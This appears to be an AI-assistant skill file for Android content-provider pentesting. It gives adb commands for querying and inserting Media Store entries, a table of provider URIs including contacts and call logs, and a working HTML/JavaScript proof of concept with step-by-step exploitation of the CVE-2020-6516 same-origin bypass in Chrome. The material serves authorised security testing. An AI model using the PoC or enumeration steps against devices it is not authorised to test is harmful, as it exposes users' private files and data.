---
name: android-content-protocol
description: Android Content Protocol pentesting - query Media Store, insert files, exploit CVE-2020-6516 SOP bypass. Use this skill whenever the user mentions Android content providers, Media Store queries, content:// URIs, Chrome SOP bypass, or needs to enumerate/access files through Android's content protocol during mobile app security testing.
---

# Android Content Protocol Pentesting

This skill helps you work with Android's Content Protocol during mobile application security assessments. Content providers expose data through `content://` URIs and can be powerful attack vectors when misconfigured.

## Core Concepts

Content providers are isolated in their own private namespace. Access requires the specific `content://` URI, which can be found in:
- Application manifests (`AndroidManifest.xml`)
- Android framework source code
- Runtime discovery through `adb shell content` commands

## Querying the Media Store

### List all indexed files
```bash
content query --uri content://media/external/file
```

### Human-friendly output (ID and path only)
```bash
content query --uri content://media/external/file --projection _id,_data
```

### Filter by application name
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```

## Inserting Files into Media Store

To insert a custom entry that can be accessed via content:// URIs:

```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
    --bind _data:s:/storage/emulated/0/test.txt \
    --bind mime_type:s:text/plain
```

Then discover the identifier:
```bash
content query --uri content://media/external/file \
    --projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```

## Chrome Content Provider Access

Chrome on Android can access content providers through the `content://` scheme. This allows it to access resources like photos or documents exported by third-party applications.

### Access a file in Chrome
Once you have the file ID, construct a URL:
```
content://media/external/file/<ID>
```

For example, if the ID is 747:
```
content://media/external/file/747
```

## CVE-2020-6516: Same-Origin-Policy Bypass

**Affected versions:** Android devices running versions earlier than Android 10 (before scoped storage)

Chrome considers `content://` as a local scheme with strict SOP rules. However, CVE-2020-6516 allowed JavaScript from a `content://` URL to access other `content://` resources, bypassing SOP.

### Proof-of-Concept

Create an HTML file that exploits this vulnerability:

```html
<html>
<head>
    <title>PoC</title>
    <script type="text/javascript">
        function poc()
        {
            var xhr = new XMLHttpRequest();

            xhr.onreadystatechange = function()
            {
                if(this.readyState == 4)
                {
                    if(this.status == 200 || this.status == 0)
                    {
                        alert(xhr.response);
                    }
                }
            }

            xhr.open("GET", "content://media/external/file/747");
            xhr.send();
        }
    </script>
</head>
<body onload="poc()"></body>
</html>
```

### Exploitation Steps

1. Upload the HTML file to `/sdcard`
2. Insert it into the Media Store using `content insert`
3. Get the file ID using `content query`
4. Open the file in Chrome via `content://media/external/file/<ID>`
5. The JavaScript will execute and can access other files in the Media Store

## Common Content Provider URIs

| Provider | URI Pattern |
|----------|-------------|
| Media Store (files) | `content://media/external/file` |
| Media Store (images) | `content://media/external/images/media` |
| Media Store (audio) | `content://media/external/audio/media` |
| Media Store (video) | `content://media/external/video/media` |
| Contacts | `content://contacts/people` |
| Call Log | `content://call_log/calls` |

## Security Considerations

1. **Exported Content Providers**: Check `AndroidManifest.xml` for `<provider>` tags with `android:exported="true"`
2. **Missing Permissions**: Some providers may not enforce proper permission checks
3. **Path Traversal**: Improper URI validation can lead to file access beyond intended scope
4. **SOP Bypass**: On older Android versions, content:// URIs may bypass browser security policies
5. **Data Leakage**: Sensitive data exposed through content providers can be accessed by any app with the right URI

## Investigation Workflow

1. **Enumerate**: Use `content query` to discover what files/data are indexed
2. **Identify**: Find content provider URIs in app manifests
3. **Test Access**: Try accessing providers without proper permissions
4. **Exploit SOP**: On Android < 10, test Chrome content:// access for SOP bypass
5. **Document**: Record any information disclosure or access control issues

## References

- [CVE-2020-6516 Analysis](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)
- Android Content Providers Documentation
- Android Security Best Practices
